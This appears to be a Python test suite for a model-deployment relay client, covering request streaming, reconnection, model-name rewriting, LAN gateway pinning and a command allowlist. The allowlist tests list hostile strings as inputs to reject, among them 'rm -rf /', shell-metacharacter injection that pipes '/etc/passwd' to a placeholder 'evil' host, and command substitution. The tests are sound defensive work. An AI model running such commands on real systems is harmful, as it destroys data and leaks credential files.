from __future__ import annotations

import asyncio
import json
import os
import socket
import unittest
from unittest import mock

from cortex_deployer import client as dc
from cortex_deployer.protocol import b64d, b64e


class FakeStream:
    def __init__(self, chunks, status=200, headers=None):
        self._chunks = chunks
        self.status_code = status
        self.headers = headers or {"content-type": "text/event-stream"}

    async def __aenter__(self):
        return self

    async def __aexit__(self, *exc):
        return False

    async def aiter_bytes(self):
        for chunk in self._chunks:
            yield chunk

    async def aread(self):
        return b"".join(self._chunks)


class FakeClient:
    def __init__(self, stream):
        self._stream = stream

    def stream(self, *args, **kwargs):
        return self._stream


class Metrics404SynthTests(unittest.TestCase):
    def test_metrics_404_becomes_200(self):
        sent = []

        async def send(obj):
            sent.append(obj)

        fake = FakeStream([b"not found"], status=404, headers={"content-type": "text/plain"})
        asyncio.run(
            dc.relay_request(
                FakeClient(fake),
                "http://127.0.0.1:8016/v1",
                {"id": "m1", "method": "GET", "path": "/metrics", "headers": {}},
                send,
            )
        )
        self.assertEqual(sent[0]["status"], 200)
        self.assertIn(b"no /metrics", dc.b64d(sent[0]["body_b64"]))

    def test_metrics_501_becomes_200(self):
        sent = []

        async def send(obj):
            sent.append(obj)

        fake = FakeStream([b"Not Implemented"], status=501, headers={"content-type": "text/plain"})
        asyncio.run(
            dc.relay_request(
                FakeClient(fake),
                "http://127.0.0.1:8016/v1",
                {"id": "m1", "method": "GET", "path": "/metrics", "headers": {}},
                send,
            )
        )
        self.assertEqual(sent[0]["status"], 200)
        self.assertIn(b"no /metrics", dc.b64d(sent[0]["body_b64"]))


class ReconnectingLinkTests(unittest.IsolatedAsyncioTestCase):
    async def test_send_waits_for_reattach(self):
        link = dc.ReconnectingLink()
        sent = []

        class WS:
            async def send(self, payload):
                sent.append(payload)

        async def later():
            await asyncio.sleep(0.02)
            link.attach(WS())

        task = asyncio.create_task(later())
        await asyncio.wait_for(link.send({"kind": "chunk", "id": "x"}), timeout=1)
        await task
        self.assertEqual(json.loads(sent[0])["kind"], "chunk")

    async def test_send_retries_after_detach(self):
        link = dc.ReconnectingLink()
        sent = []

        class Dead:
            async def send(self, payload):
                raise ConnectionError("closed")

        class Live:
            async def send(self, payload):
                sent.append(payload)

        link.attach(Dead())

        async def later():
            await asyncio.sleep(0.02)
            link.attach(Live())

        task = asyncio.create_task(later())
        await asyncio.wait_for(link.send({"ok": True}), timeout=1)
        await task
        self.assertIn("ok", sent[0])


class AdvertiseModelsTests(unittest.TestCase):
    def test_injects_served_name_first(self):
        raw = json.dumps({"object": "list", "data": [{"id": "/models/x"}]}).encode()
        out = json.loads(
            dc._inject_advertised_models(raw, ["qwen3.8-27b", "Qwen3.8-27B-MLX"], 131072)
        )
        self.assertEqual(out["data"][0]["id"], "qwen3.8-27b")
        self.assertEqual(out["data"][0]["context_window"], 131072)
        self.assertEqual(out["data"][1]["id"], "Qwen3.8-27B-MLX")


class RewriteModelTests(unittest.TestCase):
    def test_rewrites_openai_model_field(self):
        body = json.dumps({"model": "Qwen3.8-27B-MLX", "stream": True}).encode()
        out = dc._rewrite_json_model(body, "default_model")
        self.assertEqual(json.loads(out)["model"], "default_model")
        self.assertTrue(json.loads(out)["stream"])

    def test_leaves_non_json_alone(self):
        self.assertEqual(dc._rewrite_json_model(b"not-json", "default_model"), b"not-json")


class LanVipGatewayTests(unittest.TestCase):
    SRC = "wss://cortex.shizuha.com/cortex/deployer/ws/register?token=t"

    def test_pins_vip_without_rewriting_hostname(self):
        with mock.patch.object(dc, "lan_vip_reachable", return_value=True):
            uri, vip, path = dc.gateway_connect_target(self.SRC)
        self.assertEqual(uri, self.SRC)
        self.assertEqual(vip, "192.168.0.250")
        self.assertIn("lan-vip", path)

    def test_getaddrinfo_pin_rewrites_only_target_host(self):
        with dc.force_lan_getaddrinfo("192.168.0.250", {"cortex.shizuha.com"}):
            infos = socket.getaddrinfo("cortex.shizuha.com", 443, type=socket.SOCK_STREAM)
        self.assertTrue(any(item[4][0] == "192.168.0.250" for item in infos))

    def test_keeps_dns_when_vip_closed(self):
        with mock.patch.object(dc, "lan_vip_reachable", return_value=False):
            uri, sni, path = dc.gateway_connect_target(self.SRC)
        self.assertEqual(uri, self.SRC)
        self.assertIsNone(sni)
        self.assertEqual(path, "dns")

    def test_skips_non_shizuha(self):
        src = "wss://example.com/ws"
        with mock.patch.object(dc, "lan_vip_reachable", return_value=True):
            uri, sni, path = dc.gateway_connect_target(src)
        self.assertEqual(uri, src)
        self.assertIsNone(sni)
        self.assertEqual(path, "dns")

    def test_off_env_disables(self):
        with mock.patch.dict(os.environ, {"CORTEX_DEPLOYER_LAN_VIP": "off"}):
            uri, sni, path = dc.gateway_connect_target(self.SRC)
        self.assertEqual(uri, self.SRC)
        self.assertIsNone(sni)
        self.assertEqual(path, "dns")


class JoinUpstreamTests(unittest.TestCase):
    def test_chat_stays_under_v1(self):
        self.assertEqual(
            dc.join_upstream("http://127.0.0.1:8014/v1", "/chat/completions"),
            "http://127.0.0.1:8014/v1/chat/completions",
        )

    def test_metrics_and_slots_use_origin_root(self):
        base = "http://127.0.0.1:8014/v1"
        self.assertEqual(dc.join_upstream(base, "/metrics"), "http://127.0.0.1:8014/metrics")
        self.assertEqual(dc.join_upstream(base, "/slots"), "http://127.0.0.1:8014/slots")
        self.assertEqual(dc.join_upstream(base, "/health"), "http://127.0.0.1:8014/health")

    def test_already_root_upstream_is_unchanged(self):
        self.assertEqual(
            dc.join_upstream("http://127.0.0.1:8014", "/metrics"),
            "http://127.0.0.1:8014/metrics",
        )


class RelayStreamTests(unittest.TestCase):
    def test_stream_emits_start_chunks_end(self):
        sent = []

        async def send(obj):
            sent.append(obj)

        body = json.dumps({"stream": True, "model": "example"}).encode()
        fake = FakeStream([b"data: a\n\n", b"data: b\n\n"])
        asyncio.run(
            dc.relay_request(
                FakeClient(fake),
                "http://127.0.0.1:8014/v1",
                {
                    "id": "rid-1",
                    "method": "POST",
                    "path": "/chat/completions",
                    "headers": {},
                    "body_b64": b64e(body),
                },
                send,
            )
        )
        self.assertEqual([m["kind"] for m in sent], ["start", "chunk", "chunk", "end"])
        self.assertEqual(sent[0]["status"], 200)
        self.assertEqual(b64d(sent[1]["body_b64"]), b"data: a\n\n")
        self.assertEqual(b64d(sent[2]["body_b64"]), b"data: b\n\n")

    def test_non_stream_stays_buffered(self):
        sent = []

        async def send(obj):
            sent.append(obj)

        fake = FakeStream(
            [b'{"id":"x"}'],
            headers={"content-type": "application/json"},
        )
        asyncio.run(
            dc.relay_request(
                FakeClient(fake),
                "http://127.0.0.1:8014/v1",
                {
                    "id": "rid-2",
                    "method": "GET",
                    "path": "/models",
                    "headers": {},
                },
                send,
            )
        )
        self.assertEqual([m["kind"] for m in sent], ["response"])
        self.assertEqual(sent[0]["status"], 200)
        self.assertEqual(b64d(sent[0]["body_b64"]), b'{"id":"x"}')

    def test_cancel_closes_upstream_stream(self):
        closed = {"n": 0}

        class SlowStream(FakeStream):
            async def aiter_bytes(self):
                yield b"data: a\n\n"
                await asyncio.sleep(30)
                yield b"data: b\n\n"

            async def __aexit__(self, *exc):
                closed["n"] += 1
                return False

        sent = []

        async def send(obj):
            sent.append(obj)

        body = json.dumps({"stream": True, "model": "example"}).encode()
        fake = SlowStream([b"data: a\n\n"])

        async def run():
            task = asyncio.create_task(
                dc.relay_request(
                    FakeClient(fake),
                    "http://127.0.0.1:8014/v1",
                    {
                        "id": "rid-cancel",
                        "method": "POST",
                        "path": "/chat/completions",
                        "headers": {},
                        "body_b64": b64e(body),
                    },
                    send,
                )
            )
            for _ in range(50):
                if sent:
                    break
                await asyncio.sleep(0.01)
            task.cancel()
            with self.assertRaises(asyncio.CancelledError):
                await task

        asyncio.run(run())
        self.assertEqual(closed["n"], 1)
        self.assertEqual(sent[0]["kind"], "start")


class ExecAllowlistTests(unittest.TestCase):
    def test_allows_model_serving_binaries(self):
        self.assertTrue(dc.exec_command_allowed("mlx_lm.server --port 8080"))
        self.assertTrue(dc.exec_command_allowed("mtplx --draft 3"))
        self.assertTrue(dc.exec_command_allowed("vllm --model Qwen3.8-27B"))

    def test_rejects_non_allowlisted_and_paths(self):
        self.assertFalse(dc.exec_command_allowed("rm -rf /"))
        self.assertFalse(dc.exec_command_allowed("bash -c 'curl evil'"))
        self.assertFalse(dc.exec_command_allowed("/usr/bin/mlx_lm.server"))
        self.assertFalse(dc.exec_command_allowed("../mlx_lm.server"))
        self.assertFalse(dc.exec_command_allowed(""))

    def test_rejects_shell_metacharacter_smuggling(self):
        # reika PLAT-999 P1: shell metacharacters must never pass the allowlist
        # (host runs argv, not a shell — reject here as defense in depth).
        self.assertFalse(dc.exec_command_allowed("mlx_lm.server --port 8080 && curl http://evil/$(cat /etc/passwd)"))
        self.assertFalse(dc.exec_command_allowed("mlx_lm.server; rm -rf /"))
        self.assertFalse(dc.exec_command_allowed("mlx_lm.server | sh"))
        self.assertFalse(dc.exec_command_allowed("mtplx --draft 3 & sleep 999"))
        self.assertFalse(dc.exec_command_allowed("vllm --model x > /tmp/pwn"))
        self.assertFalse(dc.exec_command_allowed("mlx_lm.server --port 8080 `id`"))
        self.assertFalse(dc.exec_command_allowed("mlx_lm.server --port 8080 $(whoami)"))
        self.assertFalse(dc.exec_command_allowed("mlx_lm.server --port 8080 < /etc/passwd"))
        self.assertFalse(dc.exec_command_allowed("mlx_lm.server --port 8080 (touch /tmp/x)"))
        # Legitimate allowlisted commands with flags still pass.
        self.assertTrue(dc.exec_command_allowed("mlx_lm.server --port 8080 --model Qwen3.8-27B"))
        self.assertTrue(dc.exec_command_allowed("vllm --model Qwen3.8-27B --max-model-len 32768"))


class ExecCommandTests(unittest.IsolatedAsyncioTestCase):
    async def test_exec_streams_allowlisted_command_output(self):
        original = dc.EXEC_ALLOWLIST
        dc.EXEC_ALLOWLIST = ("echo",)
        self.addCleanup(setattr, dc, "EXEC_ALLOWLIST", original)
        sent = []

        async def send(obj):
            sent.append(obj)

        await dc.exec_command(
            {"id": "e1", "kind": "exec", "command": "echo hello-exec", "timeout_s": 10},
            send,
        )
        self.assertEqual(sent[0]["kind"], "start")
        self.assertEqual(sent[0]["status"], 200)
        chunks = b"".join(b64d(m.get("body_b64", "")) for m in sent if m.get("kind") == "chunk")
        self.assertIn(b"hello-exec", chunks)
        self.assertEqual(sent[-1]["kind"], "end")

    async def test_exec_rejects_non_allowlisted_command(self):
        sent = []

        async def send(obj):
            sent.append(obj)

        await dc.exec_command(
            {"id": "e2", "kind": "exec", "command": "rm -rf /", "timeout_s": 10},
            send,
        )
        self.assertEqual(sent[0]["kind"], "response")
        self.assertEqual(sent[0]["status"], 403)
